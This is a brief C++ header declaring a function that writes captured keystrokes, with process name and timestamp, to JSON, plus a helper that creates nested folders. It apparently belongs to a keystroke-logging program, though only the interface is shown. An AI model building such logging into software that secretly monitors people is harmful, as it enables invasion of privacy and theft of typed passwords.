#pragma once
#include <string>
#include <ctime>

void WriteKeystrokeToJson(const std::wstring& process, const std::wstring& text, std::time_t timestamp);
void createNestedFolders(const std::string& path);
